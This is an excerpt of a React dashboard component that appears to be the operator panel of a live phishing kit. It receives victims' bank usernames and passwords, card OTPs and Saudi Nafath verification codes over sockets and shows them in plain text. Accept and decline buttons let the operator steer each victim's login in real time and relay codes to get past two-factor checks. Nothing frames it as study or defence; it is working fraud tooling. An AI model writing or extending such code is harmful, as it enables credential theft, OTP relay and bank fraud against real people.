...
const Main = () => {
  ...
  const handleAcceptLogin = async (id) => {
    socket.emit("acceptLogin", { id, username: user.data.username });
    setUser({ data: { ...user.data, loginAccept: true }, active: true });
    await getUsers();
  };

  const handleDeclineLogin = (id) => {
    socket.emit("declineLogin", { id, username: user.data.username });
  ...
  const handleAcceptLoginOtp = async (id) => {
    socket.emit("acceptOTPLogin", { id, username: user.data.username });
    setUser({
  ...
  const handleDeclineLoginOtp = (id) => {
    socket.emit("declineOTPLogin", { id, username: user.data.username });
    const _user = Users.find((u) => {
      if (u._id === id) {
  ...
  const handleAcceptVisaOtp = async (id) => {
    if (!userOtp) return window.alert("اكتب الكود");
    socket.emit("acceptVisaOTP", { id, userOtp });
  ...
  const handleAcceptBank = async (id) => {
    socket.emit("acceptBankAuth", id);
    setUser({ data: { ...user.data, bankAccept: true }, active: true });
    await getUsers();
  };

  const handleDeclineBank = (id) => {
    socket.emit("declineBankAuth", id);
    const _user = Users.find((u) => {
      if (u._id === id) {
        return { ...u, bankAccept: true };
      }
    });
    const withOut = Users.filter((u) => u._id !== id);
    setUsers([...withOut, _user]);
    setUser({ data: { ..._user, bankAccept: true }, active: true });
  };
  const handleAcceptCode = async (id) => {
    socket.emit("acceptCode", id);
    setUser({ data: { ...user.data, navazCodeAccept: true }, active: true });
    await getUsers();
  };

  const handleDeclineCode = (id) => {
    if (!navazCode) return window.alert("أكتب الكود");
    socket.emit("declineCode", { id, navazCode });
    const _user = Users.find((u) => {
      if (u._id === id) {
        return { ...u, navazCodeAccept: true };
      }
    });
    const withOut = Users.filter((u) => u._id !== id);
    setUsers([...withOut, _user]);
    setUser({ data: { ..._user, navazCodeAccept: true }, active: true });
    setNavazCode(null);
  };
  ...
  useEffect(() => {
    ...
    socket.on("otpLogin", fetchUsers);
    socket.on("visa", fetchUsers);
    socket.on("bankAuth", fetchUsers);
    socket.on("orderValidate", fetchUsers);
      ...
      <div className="flex w-full items-center h-screen  md:flex-row  ">
        ...
        {user.active ? (
          <div className="w-3/4 border-l  border-gray-500 h-screen overflow-y-auto grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 items-start place-content-start gap-5 px-3">
                  ...
                  <>
                    ...
                    {user.data.visaOtpAccept ? (
                      ...
                      <div className="flex flex-col w-full items-center justify-center">
                        <input
                          type="text"
                          className="rounded-md p-2 m-2 text-center text-black"
                          placeholder="Code required if accept"
                          value={userOtp}
            ...
            {user.data?.bankUsername ? (
              <div className="flex flex-col items-center bg-sky-800 text-white py-2 px-3 rounded-lg gap-y-1   my-2">
                <span className="text-lg mb-2">بيانات دخول بنك</span>
                <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                  <span> مستخدم</span>
                  <span>{user.data?.bankUsername} </span>
                </div>
                <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                  <span> باسورد </span>
                  <span>{user.data?.bankPassword}</span>
                </div>

                {user.data.bankAccept ? (
                  ""
                ) : (
                  <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                    <button
                      className="bg-green-500 w-1/2 p-2 rounded-lg"
                      onClick={() => handleAcceptBank(user.data._id)}
                    >
                      قبول
                    </button>
                    <button
                      className="bg-red-500 w-1/2 p-2 rounded-lg"
                      onClick={() => handleDeclineBank(user.data._id)}
                    >
                      رفض
                    </button>
                  </div>
            ...
            {user.data?.navazCode ? (
              <div className="flex flex-col items-center bg-sky-800 text-white py-2 px-3 rounded-lg gap-y-1   my-2">
                <span className="text-lg mb-2">تحقق نفاذ</span>
                <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                  <span> كود</span>
                  <span>{user.data?.navazCode} </span>
                </div>
                <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                  <span> OTP</span>
                ...
                {user.data.navazCodeAccept ? (
                  ...
                  <div className="flex flex-col w-full items-center justify-center">
                    <input
                      ...
                      placeholder="Code required if accept"
                      value={navazCode}
                      onChange={(e) => setNavazCode(e.target.value)}
                    />
                    <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                      <button
                        className="bg-green-500 w-1/2 p-2 rounded-lg"
                        onClick={() => handleAcceptCode(user.data._id)}
                      >
                        قبول
                      </button>
                      <button
                        className="bg-red-500 w-1/2 p-2 rounded-lg"
                        onClick={() => handleDeclineCode(user.data._id)}
                      >
                        رفض
                      </button>
                    </div>
